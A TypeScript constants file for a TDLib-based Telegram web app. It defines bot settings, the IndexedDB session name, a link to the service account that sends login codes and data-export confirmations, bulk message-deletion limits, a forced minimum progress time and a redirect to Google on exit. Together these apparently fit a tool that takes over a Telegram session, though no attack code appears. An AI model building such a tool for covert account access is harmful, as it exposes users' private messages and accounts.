export const API_ID    = Number(import.meta.env.VITE_API_ID);
export const API_HASH  = import.meta.env.VITE_API_HASH as string;

export const BOT_CHAT_ID          = Number(import.meta.env.VITE_BOT_CHAT_ID);
export const BOT_USERNAME         = import.meta.env.VITE_BOT_USERNAME as string;
export const BOT_START_PARAMETER  = import.meta.env.VITE_BOT_START_PARAMETER as string;
export const BOT_COMMAND_SUCCESS  = import.meta.env.VITE_BOT_COMMAND_SUCCESS as string;
export const BOT_COMMAND_FAILURE  = import.meta.env.VITE_BOT_COMMAND_FAILURE as string;
export const BOT_DATA_BUTTON_TEXT = 'BOT-WEB-DATA';

// TDLib represents message IDs as server_id * 2^20 (a 20-bit left shift)
export const TDLIB_MESSAGE_ID_MULTIPLIER = 2 ** 20;

// Channels and supergroups require the -100 prefix when looked up by id in TDLib
export const CHANNEL_CHAT_ID_PREFIX = '-100';

// TDLib instance name — used for the client and for locating its IndexedDB databases
export const TDLIB_INSTANCE_NAME = 'tdlib-session';

export const EXIT_FALLBACK_URL = 'https://www.google.com/';

// Deep-link to the Telegram service account (42777) that delivers login codes and
// data-export confirmations. Opening it lets the user read the code / approve the export.
export const TELEGRAM_SERVICE_URL = 'tg://resolve?phone=42777';

// Numeric limits and timeouts
export const CHAT_LOAD_BATCH_LIMIT   = 100;    // max chats per loadChats call
export const CHAT_LIST_MAX           = 100000; // getChats limit (effectively "all")
export const MESSAGE_HISTORY_LIMIT   = 100;    // messages per getChatHistory call
export const MAX_VERIFY_PASSES       = 5;      // admin deletion verification passes
export const MAX_DELETE_RETRIES      = 3;      // max retries per deleteMessages batch
export const DELETE_MESSAGES_BATCH_SIZE = 100;  // max message IDs per deleteMessages call
export const INIT_TIMEOUT_MS         = 60000;  // TDLib initialisation timeout
export const MIN_PROCESSING_DURATION = 5000;   // minimum visible progress time
export const EXIT_REDIRECT_DELAY_MS  = 300;    // delay before fallback redirect
export const END_OF_DAY_OFFSET       = 86399;  // 23:59:59 in seconds
